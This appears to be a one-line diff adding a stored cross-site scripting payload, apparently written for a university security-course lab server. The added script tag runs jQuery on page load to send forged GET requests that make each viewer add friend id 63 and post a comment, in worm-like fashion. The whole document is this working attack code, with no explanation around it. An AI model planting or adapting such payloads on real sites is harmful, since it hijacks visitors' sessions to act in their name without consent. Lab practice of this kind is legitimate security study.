@@ -1,0 +1,1 @@
+<script>$(document).ready(function(){$.ajax({type:"GET",url:"http://csec380-core.csec.rit.edu:86/add_friend.php?id=63"})});$(document).ready(function(){$.ajax({type:"GET",url: "http://csec380-core.csec.rit.edu:86/add_comment.php?comment=NONONONONO"})});</script>
